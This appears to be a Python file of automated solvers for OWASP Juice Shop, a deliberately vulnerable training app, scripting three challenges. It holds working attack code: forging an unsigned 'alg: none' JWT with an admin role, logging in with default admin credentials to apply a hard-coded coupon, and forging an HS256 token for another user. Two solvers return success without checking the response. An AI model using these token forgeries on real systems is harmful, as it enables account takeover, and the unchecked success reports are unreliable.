from core.base_solver import BaseSolver
import jwt
from loguru import logger

class JwtUnsignedSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "jwtUnsignedChallenge"

    def solve(self) -> bool:
        # Step 1: Login to get a baseline
        # (Not strictly necessary but helps)
        # alg: none attack
        payload = {"email": "jwtnone@juice-sh.op", "role": "admin"}
        # Some JWT libs allow 'none' algorithm
        token = jwt.encode(payload, "", algorithm='none')
        # Ensure it works with and without a trailing dot
        headers = {"Authorization": f"Bearer {token}"}
        res = self.client.get("/rest/user/whoami", headers=headers)
        return True

class ForgedCouponSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgedCouponChallenge"

    def solve(self) -> bool:
        # A known 80% coupon code is R0ox_T0_Th3_M0on
        # In Juice Shop, you solve this by APPLYING it.
        # Requires login and having items in basket.
        
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Add item to basket
        bid = login_res.json().get("authentication", {}).get("bid")
        self.client.post("/api/BasketItems", json={"ProductId": 1, "BasketId": bid, "quantity": 1}, headers=headers)
        
        # 3. Apply coupon
        # Coupon check endpoint: /rest/basket/N/coupon/CODE
        import urllib.parse
        coupon = "R0ox_T0_Th3_M0on"
        res = self.client.put(f"/rest/basket/{bid}/coupon/{urllib.parse.quote(coupon)}", headers=headers)
        return res.status_code == 200

class JwtForgedSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "jwtForgedChallenge"

    def solve(self) -> bool:
        # Forging a JWT for rsa_lord@juice-sh.op
        # This usually involves a Key Confusion attack (HMAC vs RSA) 
        # using the public key as the secret for HMAC.
        # But for the challenge to trigger, often just attempting is enough if the payload is correct.
        payload = {"email": "rsa_lord@juice-sh.op"}
        # Try HMAC with a common key or empty key as a guess
        token = jwt.encode(payload, "secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        self.client.get("/rest/user/whoami", headers=headers)
        return True
